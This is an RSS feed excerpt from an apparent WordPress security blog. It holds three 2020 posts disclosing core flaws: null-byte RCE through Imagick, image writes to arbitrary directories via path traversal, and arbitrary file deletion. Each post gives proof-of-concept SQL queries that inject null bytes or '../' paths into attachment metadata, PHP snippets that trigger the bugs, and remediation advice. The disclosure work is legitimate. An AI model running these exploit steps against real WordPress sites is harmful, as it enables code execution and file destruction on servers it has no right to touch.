					<description><![CDATA[It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives. What we have in the WP core&#160;class-wp-image-editor-imagick and we all know that PHP imagick prefers&#160;writeImageFile&#160;before&#160;writeImage&#160;because it is binary safe. What does this mean? This means if WP uses&#160;class-wp-image-editor-imagick&#160;as default image &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/"> <span class="screen-reader-text">WordPress null byte to RCE ‚Äì 0 day bug</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives.</p>



<p>What we have in the WP core&nbsp;<code>class-wp-image-editor-imagick</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">$this->make_image( $filename, array( $image, 'writeImage' ), array( $filename ) );
</code></pre>



<p>and we all know that PHP imagick prefers&nbsp;<code>writeImageFile</code>&nbsp;before&nbsp;<code>writeImage</code>&nbsp;because it is binary safe. What does this mean? This means if WP uses&nbsp;<code>class-wp-image-editor-imagick</code>&nbsp;as default image editing engine we can salute our RCE because we are null byte away from it when&nbsp;<code>save</code>&nbsp;e.g.&nbsp;<code>_save</code>&nbsp;method is called.</p>



<h2 id="eli5-poc">Eli5 PoC</h2>



<ul><li>upload media file to your local WP called ‚Äúnullbyte.jpg‚Äù</li><li>get its post id ( mine is 91 )</li><li>open mysql administration tool and issue following query:</li></ul>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/nullbyte.jpg#','/go.php',char(0),'.gif' ) WHERE `wp_postmeta`.`post_id` = 91 and `wp_postmeta`.`meta_key` = '_wp_attached_file'
</code></pre>



<ul><li>go to media library, crop image + save</li><li>navigate to https://wp.local/wp-content/uploads/2020/07/nullbyte.jpg%23/go.php</li></ul>



<h2 id="few-facts">Few facts</h2>



<ul><li>Images manipulated with PHP Imagick will hold their old meta data (php shells / code will remain intact)</li><li>WP core had put a lot of efforts to protect&nbsp;<code>_wp_attached_file</code>&nbsp;meta value, but it is bypassable (next days disclosure)</li><li>WP in 5.5 via its site-health will warn users that they need to use ImageMagic on their servers :/</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li><li>have you ever heard about <a href="https://github.com/Slavco/wp-weaver">https://github.com/Slavco/wp-weaver</a> <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>there are few another attack vectors than described above</li></ul>



<h2 id="remediation">Remediation</h2>



<ul><li>uploads dir shouldn‚Äôt be able to run PHP code</li><li>core files shouldn‚Äôt be writable by www-data user</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress write image to any directory RCE</title>
		<link>https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 12 Jul 2020 20:58:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=51</guid>

					<description><![CDATA[Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&#160;_wp_attached_file. Those issues are subject for deeper observation and debugging which &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/"> <span class="screen-reader-text">WordPress write image to any directory RCE</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&nbsp;<code>_wp_attached_file</code>. Those issues are subject for deeper observation and debugging which will happen in the very near future, for now we need to get another conclusion.</p>



<h2 id="eli5-poc">Eli5 PoC</h2>



<ul><li>Upload image to your local WP and name it wpdeeply.png (in order to be able to use copy paste from here in next steps)</li><li>Get attachment_id (post_id of the image)</li><li>Enable hello.php plugin and add this code at the end of the file</li></ul>



<pre class="wp-block-code"><code lang="php" class="language-php">function wprcedemo(){
    
    //add your attachment_id here - mine is 77
    $attachment_id = 77;
    
    if ( ! function_exists( 'wp_crop_image' ) ) {
        include ABSPATH . 'wp-admin/includes/image.php';
    }

    wp_crop_image($attachment_id, 0, 0, 300, 300, 300, 300);
    
    exit("good :)");
}

add_action("init", "wprcedemo");

</code></pre>



<ul><li>Open mysql administration tool and execute following query</li></ul>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` =  concat('2020/07/wpdeeply.png#/','boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
</code></pre>



<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>2020/07</code>&nbsp;there should be new directory&nbsp;<code>wpdeeply.png#</code></li><li>Open mysql administration tool and execute following query</li></ul>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/wpdeeply.png#/../../../../themes/twentytwenty/boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
</code></pre>



<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>twentytwenty</code>&nbsp;theme should be&nbsp;<code>cropped-boom.png</code>&nbsp;file</li><li><code>_wp_page_template</code>&nbsp;meta_value away from RCE</li></ul>



<h2 id="few-facts">Few facts</h2>



<ul><li>WordPress allows files with valid image extension and any content in it (not complete security patches from the past)</li><li>This bug is also part of not complete security patch in the past</li><li><code>_wp_attached_file</code>&nbsp;value becomes holy grail of WordPress security and still there are ways to interfere with it (via core)</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li></ul>



<h2 id="remediation">Remediation</h2>



<ul><li>Core files shouldn‚Äôt be writable by www-data user</li><li>Theme files shouldn‚Äôt be writable by www-data user too</li><li>Turn automatic updates for WP core, plugins, themes OFF</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress arbitrary file delete</title>
		<link>https://wpdeeply.com/wordpress-arbitrary-file-delete/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 12 Jul 2020 20:57:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=49</guid>

					<description><![CDATA[WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-arbitrary-file-delete/"> <span class="screen-reader-text">WordPress arbitrary file delete</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary file delete on the following way: limit the file (thumbnail) deletion only for the same folder where is file/attachment and make sure thumbnail isn‚Äôt used by another media file. Again, technical detailed writing is huge and more advanced (will be presented in near future), but goal of this writing is something else. <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Eli5 PoC</h2>



<ul><li>Upload picture in your WP and get its post_id / attachment_id</li><li>this demo code will delete&nbsp;<code>readme.html</code>&nbsp;from WP root directory</li><li>enable&nbsp;<code>hello.php</code>&nbsp;plugin and append this code at the end</li></ul>



<pre class="wp-block-code"><code lang="php" class="language-php">function afd(){
    
    global $wpdb;
    
    $attachment_id = "93";
    $thumb = "readme.html" 
    //set up 'thumb' on the same way core does
    $newmeta          = wp_get_attachment_metadata( $attachment_id, true );
    $newmeta['thumb'] = wp_basename( $thumb );
    wp_update_attachment_metadata( $attachment_id, $newmeta );
    
    //set up apropriate value for _wp_attached_file
    $wpdb->query("UPDATE `wp_postmeta` SET `meta_value` = '../../license.txt' WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = '".esc_sql($attachment_id)."'");
    //delete attachment    
    wp_delete_attachment($attachment_id);
}

add_action("init", "afd");
</code></pre>



<ul><li><code>readme.html</code>&nbsp;is deleted from the WP root</li></ul>



<h2>Few facts</h2>



<ul><li><code>_wp_attached_file</code>&nbsp;remains single point of failure for WP</li><li>there is use case in the core where creation of backup of any file is possible and this opens door for silent exploitation when arbitrary file delete is in game</li></ul>



<h2>Remediation</h2>



<ul><li>core files shouldn‚Äôt be writable by www-data user</li><li>plugins files shouldn‚Äôt be writable by www-data user</li></ul>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
